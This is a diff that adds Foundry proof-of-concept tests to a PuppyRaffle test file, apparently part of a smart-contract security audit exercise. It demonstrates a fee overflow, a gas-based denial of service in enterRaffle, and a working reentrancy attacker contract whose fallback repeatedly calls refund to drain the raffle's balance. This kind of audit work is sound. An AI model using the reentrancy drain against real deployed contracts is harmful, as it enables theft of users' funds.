@@ -136,6 +136,45 @@ contract PuppyRaffleTest is Test {
         puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
         _;
     }
+    function testTotalFeesOverflow() public playersEntered {
+        // We finish a raffle of 4 to collect some fees
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+        /**
+         * totalAmountCollected = 4e18 (4 ether)
+         * prizePool = 3200000000000000000(3.2 ether)
+         * fee = 800000000000000000(0.8 ether)
+         */
+        puppyRaffle.selectWinner();
+        
+        uint256 startingTotalFees = puppyRaffle.totalFees();
+        // startingTotalFees = 800000000000000000
+
+        // We then have 89 players enter a new raffle
+        uint256 playersNum = 89;
+        address[] memory players = new address[](playersNum);
+        for (uint256 i = 0; i < playersNum; i++) {
+            players[i] = address(i);
+        }
+        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
+        // We end the raffle
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+
+        // And here is where the issue occurs
+        // We will now have fewer fees even though we just finished a second raffle
+        puppyRaffle.selectWinner();
+
+        uint256 endingTotalFees = puppyRaffle.totalFees();
+        console.log("ending total fees", endingTotalFees);
+        console.log("starting total fees", startingTotalFees);
+        assert(endingTotalFees < startingTotalFees);
+
+        // We are also unable to withdraw any fees because of the require check
+        vm.prank(puppyRaffle.feeAddress());
+        vm.expectRevert("PuppyRaffle: There are currently players active!");
+        puppyRaffle.withdrawFees();
+    }
 
     function testCantSelectWinnerBeforeRaffleEnds() public playersEntered {
         vm.expectRevert("PuppyRaffle: Raffle not over");
@@ -213,4 +252,99 @@ contract PuppyRaffleTest is Test {
         puppyRaffle.withdrawFees();
         assertEq(address(feeAddress).balance, expectedPrizeAmount);
     }
+
+
+
+    function test_DOS_enterRaffle() public{
+        vm.txGasPrice(1);
+        uint256 playersNum = 100;
+        address[] memory  players = new address[](playersNum);
+        for(uint256 i =0; i < playersNum; i++){
+            players[i] = address(i);
+        }
+        uint256 gasStart = gasleft(); 
+        /**
+         * // at start the gas price will always more, after doing some execution, the gas will eventually decreased.
+         */
+        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
+        uint256 gasEnd  = gasleft();
+        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
+        console.log("Gas cost of the first 100 players:", gasUsedFirst);
+
+        //now for the second 100 players
+        address[] memory  playersTwo  = new address[](playersNum);
+        for(uint256 i =0; i < playersNum; i++){
+            playersTwo[i] = address(i + playersNum);
+            /**
+             * address(i + playersNum); here, the addresses start from 100, 101, 102 ...
+             */
+        }
+        uint256 gasStartSecond = gasleft(); 
+        /**
+         * // at start the gas price will always more, after doing some execution, the gas will eventually decreased.
+         */
+        puppyRaffle.enterRaffle{value: entranceFee * playersTwo.length}(playersTwo);
+        uint256 gasEndSecond  = gasleft();
+        uint256 gasUsedSecond = (gasStartSecond - gasEndSecond) * tx.gasprice;
+        console.log("Gas cost of the second 100 players:", gasUsedSecond);
+
+        assert(gasUsedFirst < gasUsedSecond);
+                // 6252128 < 18068218
+    }
+
+
+
+    function  test_reentrancyRefund() public{
+       address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
+        address attackUser = makeAddr("attackUser");
+        vm.deal(attackUser, 1 ether);
+
+
+        uint256 startingAttackContractBalance = address(attackerContract).balance;
+        uint256 startingContractBalance = address(puppyRaffle).balance;
+
+        vm.prank(attackUser);
+        attackerContract.Attack{value: entranceFee}();
+
+        console.log("starting attacker contract balance:", startingAttackContractBalance);
+        console.log("starting  contract balance:", startingContractBalance);
+
+        console.log("ending attacker contract balance:", address(attackerContract).balance);
+        console.log("ending  contract balance:", address(puppyRaffle).balance);
+    }
+}
+
+contract ReentrancyAttacker{
+    PuppyRaffle puppyRaffle;
+    uint256 entranceFee;
+    uint256 attackerIndex;
+
+    constructor(PuppyRaffle _puppyRaffle){
+        puppyRaffle = _puppyRaffle;
+        entranceFee = puppyRaffle.entranceFee();
+    }
+
+    function Attack() external payable{
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        puppyRaffle.enterRaffle{value:entranceFee}(players);
+
+        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+        puppyRaffle.refund(attackerIndex);
+    }
+
+    fallback()external payable{
+        if(address(puppyRaffle).balance >= entranceFee){
+            puppyRaffle.refund(attackerIndex);
+        }
+    }
+
+
 }
